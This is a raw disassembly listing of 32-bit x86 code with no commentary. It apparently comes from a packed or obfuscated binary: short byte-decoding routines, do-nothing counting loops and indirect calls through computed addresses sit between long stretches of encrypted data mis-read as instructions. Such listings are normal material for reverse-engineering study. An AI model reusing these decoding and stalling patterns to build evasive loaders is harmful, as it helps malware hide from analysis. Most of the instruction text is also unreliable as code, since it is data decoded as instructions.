  4073ba:	mov    ecx,DWORD PTR [ebp-0x8]
  4073bd:	xor    al,0x47
  4073bf:	sub    al,0x37
  4073c1:	mov    BYTE PTR [ecx],al
  4073c3:	lea    eax,[ebp-0x8]
  4073c6:	inc    BYTE PTR [eax]
  4073c8:	inc    eax
  4073c9:	push   eax
  4073ca:	pop    ecx
  4073cb:	dec    ecx
  4073cc:	xchg   ecx,edx
  4073ce:	jmp    0x40771b
  4073d3:	sub    BYTE PTR [esi],ah
  4073d5:	cs cdq 
  4073d7:	cs mov cl,0xb3
  4073da:	mov    cl,0x3e
  4073dc:	sbb    ebp,edx
  4073de:	into   
  4073df:	xchg   esp,eax
  4073e0:	jnp    0x407408
  4073e2:	fisubr WORD PTR [ebx+0x207070c1]
  4073e8:	jge    0x40745a
  4073ea:	jo     0x407391
  4073ec:	cmp    DWORD PTR [esi-0x1e3fdf72],esi
  4073f2:	sub    eax,esp
  4073f4:	jne    0x4073bc
  4073f6:	repnz sub cl,BYTE PTR [ebp+ebp*1-0x7f]
  4073fb:	test   eax,0xb4e35d7a
  407400:	pop    ebp
  407401:	push   ecx
  407402:	ret    0xc95c
  407405:	mov    ds:0x9b5c1942,eax
  40740a:	stos   BYTE PTR es:[edi],al
  40740b:	cmc    
  40740c:	xor    al,0xbb
  40740e:	(bad)  
  40740f:	in     eax,dx
  407410:	pop    esi
  407411:	repz mul BYTE PTR ds:0x226114a1
  407418:	fst    QWORD PTR [eax+0x1ab7bb6b]
  40741e:	mov    esp,0x3f4b83e
  407423:	xor    DWORD PTR [ebp-0xda83b3e],esp
  407429:	arpl   WORD PTR [ebp+0x618f1cff],bp
  40742f:	mov    es,esi
  407431:	repnz cli 
  407433:	fidiv  DWORD PTR [ebx-0x67]
  407436:	mov    cr7,edx
  407439:	push   ds
  40743a:	sbb    al,0x1f
  40743c:	cmp    dl,bh
  40743e:	outs   dx,BYTE PTR ds:[esi]
  40743f:	xchg   esi,eax
  407440:	out    0xf5,al
  407442:	add    BYTE PTR ds:[ecx+0x7086b5be],dl
  407449:	and    ecx,DWORD PTR [eax+esi*4+0x193f2370]
  407450:	or     ah,BYTE PTR [edx+0x48]
  407453:	imul   ebx,DWORD PTR [esi-0x48],0x2
  407457:	sbb    edi,DWORD PTR [edx]
  407459:	xor    BYTE PTR [eax+0xa],bh
  40745c:	push   esi
  40745d:	stos   DWORD PTR es:[edi],eax
  40745e:	fisttp DWORD PTR [edi]
  407460:	and    eax,0x9ec98906
  407465:	add    ebx,DWORD PTR [ecx]
  407467:	aad    0x6
  407469:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40746a:	rcr    BYTE PTR [ebp+0x4603f223],0x0
  407471:	jbe    0x407457
  407473:	aaa    
  407474:	xor    al,0x51
  407476:	(bad)  
  407477:	adc    ah,BYTE PTR [esi-0x1]
  40747a:	add    DWORD PTR ds:0x9a9ebb17,0x40
  407481:	jmp    0x3be1:0x75a71e3d
  407488:	mov    al,ds:0x41e6a2e4
  40748d:	add    DWORD PTR [ebx+0x6f],0x2f
  407491:	lods   al,BYTE PTR ds:[esi]
  407492:	dec    ebp
  407493:	es dec eax
  407495:	adc    DWORD PTR [eax+0x631c8238],ebp
  40749b:	push   esp
  40749c:	adc    al,0xa3
  40749e:	xor    cl,0xbc
  4074a1:	sbb    BYTE PTR [edi-0x3781a442],bl
  4074a7:	adc    DWORD PTR [eax+ecx*1+0x2b],edx
  4074ab:	mov    eax,ds:0xf65dd0fa
  4074b0:	(bad)  [ecx*8+0x6a99700]
  4074b7:	mov    ah,0xfe
  4074b9:	cmp    eax,0xb793f5d5
  4074be:	push   eax
  4074bf:	xor    BYTE PTR [ebx],ah
  4074c1:	inc    ecx
  4074c2:	push   cs
  4074c3:	ror    BYTE PTR [eax+0x19eaf49b],1
  4074c9:	mov    ch,0xa5
  4074cb:	dec    edx
  4074cc:	jge    0x40747c
  4074ce:	adc    edx,DWORD PTR [ebp+0x79]
  4074d1:	xchg   edx,eax
  4074d2:	sar    DWORD PTR [ebx],cl
  4074d4:	int3   
  4074d5:	in     eax,dx
  4074d6:	sub    eax,0x81dd44f8
  4074db:	push   edi
  4074dc:	addr16 push ss
  4074de:	cs sbb al,0x20
  4074e1:	test   al,0xca
  4074e3:	hlt    
  4074e4:	xchg   esp,eax
  4074e5:	and    BYTE PTR [edx+0x7f7dfff6],cl
  4074eb:	(bad)  
  4074ed:	retf   0xf505
  4074f0:	inc    ebx
  4074f1:	push   ebx
  4074f2:	sbb    BYTE PTR [ecx-0x1a6f40b7],al
  4074f8:	retf   
  4074f9:	mov    dl,0xdb
  4074fb:	sub    al,0xf2
  4074fd:	mov    DWORD PTR [edx],eax
  4074ff:	ss in  al,0x6d
  407502:	les    ebp,FWORD PTR [ecx]
  407504:	push   ecx
  407505:	retf   
  407506:	ja     0x40749f
  407508:	mov    bl,BYTE PTR [ebx]
  40750a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40750b:	inc    ecx
  40750c:	sar    BYTE PTR [eax-0x2],1
  40750f:	in     al,0xbd
  407511:	out    dx,al
  407512:	dec    esp
  407513:	sti    
  407514:	ins    DWORD PTR es:[edi],dx
  407515:	gs push cs
  407517:	pop    ecx
  407518:	add    dl,BYTE PTR [edx]
  40751a:	out    dx,eax
  40751b:	stos   BYTE PTR es:[edi],al
  40751c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40751d:	rol    BYTE PTR [ebp+0x79],0xc5
  407521:	retf   
  407522:	jbe    0x407503
  407524:	call   0x568da0c2
  407529:	mov    ds:0x7155146c,al
  40752e:	xchg   esi,eax
  40752f:	and    esi,DWORD PTR [ecx+0x66eccec3]
  407535:	outs   dx,DWORD PTR ds:[esi]
  407536:	xchg   edi,eax
  407537:	jl     0x407518
  407539:	mov    dl,0x9
  40753b:	int    0x48
  40753d:	retf   
  40753e:	loopne 0x407523
  407540:	mov    WORD PTR [eax-0x60],fs
  407543:	das    
  407544:	loope  0x40759e
  407546:	jmp    0xb7a5:0xcfb39bc6
  40754d:	popf   
  40754e:	pop    eax
  40754f:	add    BYTE PTR [ebx-0x55c1c47b],0x60
  407556:	in     eax,0x79
  407558:	arpl   dx,dx
  40755a:	xchg   ebx,eax
  40755b:	cdq    
  40755c:	sbb    eax,0x3f56f0ba
  407561:	loopne 0x40753e
  407563:	mov    dh,0xc5
  407565:	aad    0x14
  407567:	mov    DWORD PTR [ebp+0x68],eax
  40756a:	and    dh,0xc8
  40756d:	inc    edi
  40756e:	sbb    al,0x16
  407570:	out    dx,eax
  407571:	gs (bad) 
  407573:	popf   
  407574:	inc    ebx
  407575:	int    0x7d
  407577:	or     al,bh
  407579:	std    
  40757a:	push   ebp
  40757b:	fistp  WORD PTR [ecx+0x5aa0a5da]
  407581:	(bad)  
  407582:	and    DWORD PTR [eax],edi
  407584:	push   cs
  407585:	xchg   edx,eax
  407586:	cmp    BYTE PTR [ebx],al
  407588:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407589:	cdq    
  40758a:	jns    0x4075ed
  40758c:	sbb    eax,0x26273c0b
  407591:	mov    gs,WORD PTR [ebp-0x4c]
  407594:	mov    bh,0x29
  407596:	(bad)  
  407598:	xor    eax,0x6338cfe1
  40759d:	daa    
  40759e:	inc    edi
  40759f:	mov    ah,0x90
  4075a1:	lds    ebx,FWORD PTR [edx-0x71]
  4075a4:	inc    edx
  4075a5:	lock inc edx
  4075a7:	mov    ebp,0x75e56665
  4075ac:	lods   eax,DWORD PTR ds:[esi]
  4075ad:	fwait
  4075ae:	sub    DWORD PTR [ecx-0x47],0xffffffb0
  4075b2:	jmp    0xdf4a6496
  4075b7:	sti    
  4075b8:	jmp    0x517d:0xcf0e1e72
  4075bf:	xor    ch,bh
  4075c1:	dec    ebx
  4075c2:	inc    esp
  4075c3:	cdq    
  4075c4:	dec    edx
  4075c5:	test   DWORD PTR [edi-0x1f],ebx
  4075c8:	(bad)  
  4075c9:	lods   eax,DWORD PTR ds:[esi]
  4075ca:	or     eax,0xd7dfa57a
  4075cf:	repnz xchg esi,eax
  4075d1:	dec    edi
  4075d2:	jbe    0x407620
  4075d4:	or     edi,DWORD PTR [edx]
  4075d6:	fidiv  DWORD PTR [edi-0x17d5b449]
  4075dc:	xor    eax,0xc1420d5c
  4075e1:	dec    edx
  4075e2:	pop    ds
  4075e3:	es sbb eax,0x6fd04063
  4075e9:	push   ds
  4075ea:	in     al,0xb8
  4075ec:	fcom   DWORD PTR ds:0x83c35154
  4075f2:	add    dl,0x58
  4075f5:	xor    DWORD PTR [ecx-0x4501e6c6],edx
  4075fb:	pop    esp
  4075fc:	fdivr  QWORD PTR [edi-0x12a5d3ed]
  407602:	jle    0x40765f
  407604:	js     0x407653
  407606:	fdiv   DWORD PTR ds:0x7ace3213
  40760c:	push   eax
  40760d:	jmp    DWORD PTR [edx*1-0x2aa494f2]
  407614:	imul   eax,DWORD PTR ss:[edi+0x1c],0x447b8088
  40761c:	cld    
  40761d:	shr    DWORD PTR [esp+esi*2+0x588311d7],0xb0
  407625:	outs   dx,BYTE PTR ds:[esi]
  407627:	xchg   edx,eax
  407628:	sar    cl,1
  40762a:	sub    DWORD PTR [edi],ecx
  40762c:	pop    ebx
  40762d:	jne    0x4075cf
  40762f:	and    bl,al
  407631:	xor    al,0xed
  407633:	pop    esp
  407634:	sbb    ah,ch
  407636:	dec    edi
  407637:	in     eax,dx
  407638:	dec    esp
  407639:	jno    0x4075e3
  40763b:	mov    dl,0xa7
  40763d:	(bad)  
  40763e:	jge    0x4076a3
  407640:	or     ebx,DWORD PTR [eax]
  407642:	cs sti 
  407644:	push   ss
  407645:	loope  0x40769a
  407647:	call   0xa4f4:0x96272c77
  40764e:	icebp  
  40764f:	lods   al,BYTE PTR ds:[esi]
  407650:	mov    ds:0x4dd97534,eax
  407655:	ins    DWORD PTR es:[edi],dx
  407656:	push   ebp
  407657:	push   edi
  407658:	enter  0xcdc1,0xe7
  40765c:	adc    eax,0x22e9de5c
  407661:	pop    esp
  407662:	retf   
  407663:	sbb    eax,0xc7cc494d
  407668:	fsub   QWORD PTR [edx]
  40766a:	dec    edi
  40766b:	mov    eax,ds:0x50f00ee3
  407670:	fisub  DWORD PTR [eax]
  407672:	inc    bp
  407674:	pop    es
  407675:	xor    esi,esp
  407677:	outs   dx,DWORD PTR ds:[esi]
  407678:	scas   eax,DWORD PTR es:[edi]
  407679:	test   DWORD PTR [ebx+0x3a1ac6b3],0x35d33aa3
  407683:	lods   eax,DWORD PTR ds:[esi]
  407684:	gs pop edi
  407686:	sub    al,0x10
  407688:	in     eax,dx
  407689:	jge    0x4076ca
  40768b:	mov    eax,ds:0x9c5ccee6
  407690:	pop    edx
  407691:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407692:	pushf  
  407693:	ret    
  407694:	mov    esi,edx
  407696:	xchg   ebx,eax
  407697:	es leave 
  407699:	ror    DWORD PTR [esi+0x1f5bbb41],1
  40769f:	je     0x407663
  4076a1:	jp     0x4076d2
  4076a3:	(bad)  
  4076a4:	(bad)  
  4076a5:	lods   al,BYTE PTR ds:[esi]
  4076a6:	sub    edi,DWORD PTR [edx-0x59]
  4076a9:	stos   BYTE PTR es:[edi],al
  4076aa:	pushf  
  4076ab:	push   ds
  4076ac:	pop    eax
  4076ad:	add    ebp,DWORD PTR [edx]
  4076af:	ja     0x40768f
  4076b1:	hlt    
  4076b2:	lods   eax,DWORD PTR ds:[esi]
  4076b3:	lahf   
  4076b4:	repz push eax
  4076b6:	and    eax,0xf9a0a60e
  4076bb:	pop    ecx
  4076bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4076bd:	pop    ebp
  4076be:	stos   BYTE PTR es:[edi],al
  4076bf:	fsub   DWORD PTR [ebp+0x7b8589da]
  4076c5:	mov    bh,BYTE PTR [ebx]
  4076c7:	xchg   edi,eax
  4076c8:	dec    ebx
  4076c9:	aas    
  4076ca:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  4076cc:	dec    esi
  4076cd:	xor    bh,al
  4076cf:	push   esp
  4076d0:	inc    edx
  4076d1:	data16 loope 0x4076c5
  4076d4:	xchg   ebp,eax
  4076d5:	fcmove st,st(4)
  4076d7:	push   ds
  4076d8:	or     eax,0x32ed6f30
  4076dd:	xlat   BYTE PTR ds:[ebx]
  4076de:	stos   DWORD PTR es:[edi],eax
  4076df:	xchg   ecx,eax
  4076e0:	dec    ecx
  4076e1:	fld    TBYTE PTR [edi+0x6a]
  4076e4:	jle    0x407740
  4076e6:	push   cs
  4076e7:	dec    edx
  4076e8:	xor    bh,BYTE PTR [ebp+0x1b]
  4076eb:	xchg   ecx,eax
  4076ec:	bound  esi,QWORD PTR [ebx-0x30db4179]
  4076f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4076f3:	mov    ecx,0xd472fd36
  4076f8:	xchg   ebp,eax
  4076f9:	or     eax,edx
  4076fb:	xchg   ebp,eax
  4076fc:	xchg   edi,eax
  4076fd:	scas   al,BYTE PTR es:[edi]
  4076fe:	ins    DWORD PTR es:[edi],dx
  4076ff:	data16 loop 0x4076d7
  407702:	ret    0x8797
  407705:	add    bl,BYTE PTR [esi]
  407707:	iret   
  407708:	push   ecx
  407709:	push   0x22
  40770b:	cdq    
  40770c:	popa   
  40770d:	lock loop 0x4076b8
  407710:	adc    cl,ch
  407712:	fwait
  407713:	nop
  407714:	cs jl  0x4076ea
  407717:	lods   eax,DWORD PTR ds:[esi]
  407718:	ror    BYTE PTR [ecx-0xf5016a],cl
  40771e:	jne    0x407710
  407720:	mov    eax,ds:0x41625c
  407725:	mov    eax,DWORD PTR [eax]
  407727:	push   DWORD PTR [eax]
  407729:	lea    eax,ds:0x416278
  40772f:	push   DWORD PTR [eax]
  407731:	lea    eax,ds:0x416024
  407737:	push   DWORD PTR [eax]
  407739:	lea    eax,ds:0x416258
  40773f:	push   DWORD PTR [eax]
  407741:	lea    eax,ds:0x4162e0
  407747:	push   DWORD PTR [eax]
  407749:	xchg   ebx,edx
  40774b:	inc    ebx
  40774c:	inc    ebx
  40774d:	sub    ebx,0x3
  407750:	push   ebx
  407751:	pop    eax
  407752:	call   DWORD PTR [eax+0x1]
  407755:	mov    eax,DWORD PTR [ebp-0x20]
  407758:	mov    ecx,DWORD PTR ds:0x41621c
  40775e:	add    DWORD PTR [eax],ecx
  407760:	pop    edi
  407761:	pop    esi
  407762:	pop    ebx
  407763:	leave  
  407764:	ret    
  407765:	push   ebp
  407766:	mov    ebp,esp
  407768:	sub    esp,0x44
  40776b:	push   edi
  40776c:	sbb    DWORD PTR ds:0x434319,edx
  407772:	mov    eax,DWORD PTR [ebp+0xc]
  407775:	mov    edx,DWORD PTR ds:0x432d64
  40777b:	mov    edi,DWORD PTR ds:0x434349
  407781:	sub    edx,edi
  407783:	xor    edx,DWORD PTR [edx+edi*1]
  407786:	mov    DWORD PTR [ebp-0x10],eax
  407789:	adc    DWORD PTR ds:0x432ce6,edx
  40778f:	mov    eax,DWORD PTR [ebp+0x8]
  407792:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  407799:	sub    ecx,DWORD PTR ds:0x434266
  40779f:	mov    DWORD PTR [ebp-0x20],0xf89c8530
  4077a6:	mov    edx,DWORD PTR [ebp+0x8]
  4077a9:	and    DWORD PTR ds:0x4325ec,0x0
  4077b3:	xor    edi,edi
  4077b5:	add    edi,DWORD PTR ds:0x4325ec
  4077bb:	inc    edi
  4077bc:	mov    DWORD PTR ds:0x4325ec,edi
  4077c2:	cmp    DWORD PTR ds:0x4325ec,0xb
  4077c9:	jne    0x4077e2
  4077cf:	push   DWORD PTR [ebp-0x14]
  4077d2:	push   0x178d
  4077d7:	push   0x434321
  4077dc:	call   DWORD PTR ds:0x4328ca
  4077e2:	cmp    DWORD PTR ds:0x4325ec,0xa
  4077e9:	jne    0x4077fe
  4077ef:	xor    edi,edi
  4077f1:	add    edi,DWORD PTR ds:0x4325ec
  4077f7:	inc    edi
  4077f8:	mov    DWORD PTR ds:0x4325ec,edi
  4077fe:	cmp    DWORD PTR ds:0x4325ec,0x1b
  407805:	jb     0x4077b3
  40780b:	mov    DWORD PTR [ebp-0x40],eax
  40780e:	mov    eax,0x7510855
  407813:	or     edi,edi
  407815:	xor    edx,eax
  407817:	mov    ecx,0x32729c
  40781c:	adc    DWORD PTR ds:0x432cde,edi
  407822:	add    edx,ecx
  407824:	mov    edi,DWORD PTR ds:0x43426e
  40782a:	or     DWORD PTR ds:0x4325fc,edi
  407830:	mov    DWORD PTR [ebp-0x8],edx
  407833:	adc    DWORD PTR ds:0x434315,ecx
  407839:	mov    edx,DWORD PTR [ebp+0x8]
  40783c:	sbb    DWORD PTR ds:0x432600,0x434292
  407846:	xor    edx,eax
  407848:	add    edx,ecx
  40784a:	mov    edi,DWORD PTR ds:0x4325ec
  407850:	or     edi,DWORD PTR ds:0x4325f0
  407856:	mov    DWORD PTR ds:0x4325ec,edi
  40785c:	mov    DWORD PTR [ebp+0xc],edx
  40785f:	inc    edi
  407860:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  407867:	mov    DWORD PTR ds:0x434325,0x1e
  407871:	cmp    DWORD PTR ds:0x434325,0x0
  407878:	je     0x407aca
  40787e:	cmp    DWORD PTR ds:0x434325,0x22
  407885:	jne    0x407891
  40788b:	call   DWORD PTR ds:0x432bf6
  407891:	xor    edi,edi
  407893:	add    edi,DWORD PTR ds:0x434325
  407899:	dec    edi
  40789a:	mov    DWORD PTR ds:0x434325,edi
  4078a0:	jmp    0x407871
  4078a5:	mov    edx,DWORD PTR ds:0x4342a6
  4078ab:	mov    edi,DWORD PTR ds:0x434369
  4078b1:	sub    edx,edi
  4078b3:	add    edx,DWORD PTR [edx+edi*1]
  4078b6:	jmp    0x407aca
  4078bb:	fldcw  WORD PTR [eax+0x3e]
  4078be:	cs push ecx
  4078c0:	mov    dh,0xe9
  4078c2:	jae    0x407865
  4078c4:	shl    DWORD PTR [edi+0x64],cl
  4078c7:	dec    esi
  4078c8:	out    0xca,al
  4078ca:	sbb    DWORD PTR [ebx-0x32],0x70
  4078ce:	jo     0x407939
  4078d0:	jg     0x407942
  4078d2:	jo     0x4078fe
  4078d4:	or     ecx,DWORD PTR [esi]
  4078d6:	xor    BYTE PTR [eax+0x70],bl
  4078d9:	fucomip st,st(6)
  4078db:	or     ebp,0x4f
  4078de:	push   eax
  4078df:	aas    
  4078e0:	dec    esi
  4078e1:	and    DWORD PTR [ebp-0x46],edi
  4078e4:	mov    dl,0xf8
  4078e6:	xchg   ecx,eax
  4078e7:	xadd   BYTE PTR [edx-0x2cf98439],ch
  4078ee:	retf   0xed47
  4078f1:	sub    esi,DWORD PTR [edx+0x77d9e0c3]
  4078f7:	rcr    DWORD PTR [edx+0x1a66553f],0xfe
  4078fe:	fiadd  DWORD PTR [edi+0x3a84c11c]
  407904:	inc    edi
  407905:	sbb    BYTE PTR [edx+0x6259a257],cl
  40790b:	(bad)  
  40790d:	int    0xb8
  40790f:	mov    al,ds:0xdc92fd1a
  407914:	cmp    esp,esp
  407916:	rol    BYTE PTR [edx],cl
  407918:	mov    bh,0x27
  40791a:	add    dl,BYTE PTR [edx+0x2fcaf89b]
  407920:	ret    
  407921:	jb     0x40796f
  407923:	jns    0x4078e1
  407925:	mov    bh,0x17
  407927:	scas   eax,DWORD PTR es:[edi]
  407928:	sbb    DWORD PTR [ebx-0x6ab5c4e],0x4f
  40792f:	mov    eax,0x87ed6b86
  407934:	xor    bl,al
  407936:	jne    0x4078f2
  407938:	pop    ecx
  407939:	push   edi
  40793a:	ja     0x4079a5
  40793c:	xchg   esp,eax
  40793d:	adc    al,0x5e
  40793f:	xlat   BYTE PTR ds:[ebx]
  407940:	in     eax,0x98
  407942:	(bad)  
  407944:	mov    ss:0x9722c6ef,eax
  40794a:	mov    ds:0xb7577315,eax
  40794f:	push   ebp
  407950:	jl     0x407934
  407952:	mov    eax,ds:0x97c7722
  407957:	fsub   QWORD PTR [edi-0x3e]
  40795a:	fistp  DWORD PTR [ecx+0x49bb309]
  407960:	jo     0x40799f
  407962:	scas   al,BYTE PTR es:[edi]
  407963:	mov    ecx,0xc34d2fc4
  407968:	sub    esp,eax
  40796a:	adc    edx,ebp
  40796c:	dec    ebp
  40796d:	bound  esi,QWORD PTR [edi-0x385d3ac6]
  407973:	push   cs
  407974:	pop    esi
  407975:	out    dx,eax
  407976:	mov    cl,0xcb
  407978:	sbb    BYTE PTR [esi],al
  40797a:	das    
  40797b:	fldl2t 
  40797d:	mov    dl,0x51
  40797f:	mov    bh,0x2f
  407981:	fwait
  407982:	call   0x1cbcc38b
  407987:	in     eax,dx
  407988:	cs mov esi,0x37c01ada
  40798e:	lock jle 0x4079ea
  407991:	mov    ebx,0x3540e187
  407996:	out    dx,eax
  407997:	stc    
  407998:	sub    eax,DWORD PTR [ebx-0x32dfc547]
  40799e:	popf   
  40799f:	and    BYTE PTR [ecx+0x28],cl
  4079a2:	add    al,0x8a
  4079a4:	mov    edi,0xf208be84
  4079a9:	xor    ah,bh
  4079ab:	ins    DWORD PTR es:[edi],dx
  4079ac:	xor    bh,0x97
  4079af:	cmp    al,0x91
  4079b1:	mov    ah,0xc4
  4079b3:	mov    eax,0x111b547
  4079b8:	sub    ecx,esp
  4079ba:	js     0x407a16
  4079bc:	push   edx
  4079bd:	aaa    
  4079be:	pop    es
  4079bf:	scas   al,BYTE PTR es:[edi]
  4079c0:	pop    es
  4079c1:	inc    esi
  4079c2:	or     eax,edi
  4079c4:	mov    dh,0x60
  4079c6:	sub    esp,DWORD PTR [eax]
  4079c8:	test   ch,ah
  4079ca:	push   ebp
  4079cb:	jns    0x40799e
  4079cd:	push   ebp
  4079ce:	inc    edi
  4079cf:	adc    dl,BYTE PTR ds:0x1c7fcd34
  4079d5:	shr    BYTE PTR [ecx-0x4a],0x51
  4079d9:	add    esp,esi
  4079db:	dec    esp
  4079dc:	imul   DWORD PTR [esi+eiz*8+0x6f]
  4079e0:	test   eax,0x552eef1e
  4079e5:	push   esp
  4079e6:	das    
  4079e7:	retf   0x6b5
  4079ea:	add    eax,0x6ebc7923
  4079ef:	js     0x407974
  4079f1:	add    eax,0xe4c1dea0
  4079f6:	hlt    
  4079f7:	push   cs
  4079f8:	push   ss
  4079f9:	mov    cl,BYTE PTR [ebx+eax*1-0x20]
  4079fd:	jl     0x407a17
  4079ff:	(bad)  
  407a00:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a02:	out    dx,al
  407a03:	dec    eax
  407a04:	push   esp
  407a05:	mov    edx,0xc369df5a
  407a0a:	xor    ebp,edx
  407a0c:	push   ds
  407a0d:	pop    es
  407a0e:	iret   
  407a0f:	call   0x6ff:0x6246c586
  407a16:	jns    0x407a3a
  407a18:	clc    
  407a19:	sbb    BYTE PTR [esi+0x6a2d7493],al
  407a1f:	aaa    
  407a20:	mov    cl,0xad
  407a22:	ret    
  407a23:	out    0xb9,al
  407a25:	push   es
  407a26:	xor    eax,0x7debcb8d
  407a2b:	pop    eax
  407a2c:	and    DWORD PTR [ebx+0xa77290b],edx
  407a32:	inc    eax
  407a33:	sub    dh,al
  407a35:	adc    eax,0xebfcd1c7
  407a3a:	loopne 0x4079bd
  407a3c:	rcr    DWORD PTR fs:[ebx+0x40],0xc8
  407a41:	mov    al,0x1e
  407a43:	inc    esi
  407a44:	cs mov ecx,0xdfd46caf
  407a4a:	lods   al,BYTE PTR ds:[esi]
  407a4b:	mov    bl,0x55
  407a4d:	mov    eax,DWORD PTR [ebp+0x74f057e9]
  407a53:	dec    ebx
  407a54:	idiv   BYTE PTR [ebp+0x67e34a3]
  407a5a:	leave  
  407a5b:	clc    
  407a5c:	xor    al,BYTE PTR [ecx+0x18d93878]
  407a62:	or     ebx,0x6d3bc625
  407a68:	in     eax,0xfa
  407a6a:	int    0xc3
  407a6c:	inc    esi
  407a6d:	jno    0x407ad2
  407a6f:	xlat   BYTE PTR ds:[ebx]
  407a70:	sub    eax,ebp
  407a72:	mov    bl,0xab
  407a74:	(bad)  
  407a75:	mov    dl,0xb0
  407a77:	pop    ss
  407a78:	add    BYTE PTR [ebx+eiz*4+0x743e90c],0xf7
  407a80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a81:	mov    edi,0xaff5dad5
  407a86:	out    0x38,eax
  407a88:	mul    BYTE PTR ds:[ebx+ebx*2+0xf]
  407a8d:	outs   dx,DWORD PTR ds:[esi]
  407a8e:	(bad)  
  407a8f:	push   edi
  407a90:	fsubr  st(3),st
  407a92:	adc    BYTE PTR [ebx],ah
  407a94:	pop    ds
  407a95:	div    BYTE PTR [ecx-0x62a928af]
  407a9b:	ficom  DWORD PTR [eax-0x64]
  407a9e:	sub    bl,al
  407aa0:	out    dx,al
  407aa1:	gs inc esp
  407aa3:	fs dec esp
  407aa5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407aa6:	xor    ebx,DWORD PTR [ebx+0x63]
  407aa9:	mov    dh,0x4a
  407aab:	retf   0xb5db
  407aae:	mov    al,ds:0x779b8890
  407ab3:	(bad)  
  407ab4:	xor    ebx,DWORD PTR [edi+eiz*1]
  407ab7:	push   0x6c
  407ab9:	sub    esi,0xffffffc1
  407abc:	pop    eax
  407abd:	in     al,0x1a
  407abf:	adc    BYTE PTR [eax-0x5a7be67b],cl
  407ac5:	(bad)  
  407ac6:	sbb    esp,0x45c795d6
  407acc:	fdiv   DWORD PTR [ebx]
  407ace:	test   DWORD PTR [eax+edi*8+0x2cce1503],ebx
  407ad5:	inc    ebx
  407ad6:	add    bh,al
  407ad8:	inc    ebp
  407ad9:	aam    0x32
  407adb:	test   DWORD PTR [eax+edi*8+0x426a3d8b],ebx
  407ae2:	inc    ebx
  407ae3:	add    BYTE PTR [ecx],ch
  407ae5:	cmp    eax,0x434272
  407aea:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  407af1:	mov    DWORD PTR [ebp-0x34],0xf89c853c
  407af8:	and    DWORD PTR ds:0x434325,edx
  407afe:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  407b05:	jmp    0x407d19
  407b0a:	lods   eax,DWORD PTR ds:[esi]
  407b0b:	mov    ds:0x75115609,al
  407b10:	jno    0x407b73
  407b12:	fidiv  DWORD PTR [edi-0xed54807]
  407b18:	pop    ss
  407b19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b1a:	push   esp
  407b1b:	int3   
  407b1c:	jo     0x407b8e
  407b1e:	imul   edi,DWORD PTR [edi+0x70],0x89298370
  407b25:	jb     0x407aac
  407b27:	hlt    
  407b28:	and    bh,dl
  407b2a:	xchg   BYTE PTR [ebx+esi*4],dl
  407b2d:	sbb    eax,0x791f1b69
  407b32:	in     al,0x72
  407b34:	in     al,dx
  407b35:	add    DWORD PTR gs:[eax],ebx
  407b38:	xor    DWORD PTR [edi+0x38f8ede7],ecx
  407b3e:	mov    ebx,0xb6fe90a4
  407b43:	cmp    al,0x97
  407b45:	out    0x3f,al
  407b47:	dec    eax
  407b48:	sub    DWORD PTR [edi+0x33e97a00],edx
  407b4e:	xchg   esi,eax
  407b4f:	test   al,0x29
  407b51:	jae    0x407b34
  407b53:	ret    
  407b54:	xchg   esi,eax
  407b55:	mov    ds:0x5a1ad396,al
  407b5a:	cmp    DWORD PTR [edx+0x1e],esp
  407b5d:	ret    
  407b5e:	(bad)  
  407b5f:	push   ecx
  407b60:	mov    al,0xc6
  407b62:	es stc 
  407b64:	mov    ?,WORD PTR [edx+ebp*2+0x25771ccb]
  407b6b:	xor    DWORD PTR [edi],esp
  407b6d:	pop    esi
  407b6e:	mov    eax,0x80dffd44
  407b73:	into   
  407b74:	ds or  eax,0xa7bda4c5
  407b7a:	lea    eax,[ecx]
  407b7c:	leave  
  407b7d:	cmp    eax,0x85e8acb4
  407b82:	mov    edi,0x9d6639fb
  407b87:	retf   0x467a
  407b8a:	xor    DWORD PTR [esi-0x3a9090b0],0x963f291e
  407b94:	and    al,ch
  407b96:	div    BYTE PTR [edi-0x6f]
  407b99:	pushf  
  407b9a:	ds ja  0x407b9a
  407b9d:	shl    BYTE PTR [eax+0x74],cl
  407ba0:	add    al,0x15
  407ba2:	aaa    
  407ba3:	icebp  
  407ba4:	cmp    BYTE PTR [esi],bl
  407ba6:	mov    edi,edx
  407ba8:	xchg   BYTE PTR [edx+0x1a],al
  407bab:	fild   DWORD PTR [ebp-0x21]
  407bae:	das    
  407baf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407bb0:	loopne 0x407b3e
  407bb2:	pop    ds
  407bb3:	xor    ebp,DWORD PTR [esi]
  407bb5:	pop    ecx
  407bb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407bb7:	lahf   
  407bb8:	rcl    DWORD PTR [edx-0x29],cl
  407bbb:	sbb    eax,0x8b6c006f
  407bc0:	pop    ecx
  407bc1:	in     al,dx
  407bc2:	mov    eax,0xd46fa3e3
  407bc7:	xchg   edi,ecx
  407bc9:	sbb    eax,0x5784b17
  407bce:	or     DWORD PTR [ecx+0x447dcef4],eax
  407bd4:	jg     0x407c20
  407bd6:	test   BYTE PTR [ebx+esi*1],dh
  407bd9:	ins    BYTE PTR es:[edi],dx
  407bda:	scas   eax,DWORD PTR es:[edi]
  407bdb:	add    ecx,DWORD PTR [ebx]
  407bdd:	jge    0x407c50
  407bdf:	mov    ch,0x91
  407be1:	neg    DWORD PTR [ebp-0xf314f74]
  407be7:	sbb    al,0x51
  407be9:	pop    edi
  407bea:	mov    al,ds:0x94a0a890
  407bef:	mov    dl,0x8a
  407bf1:	jl     0x407bf6
  407bf3:	xchg   edx,eax
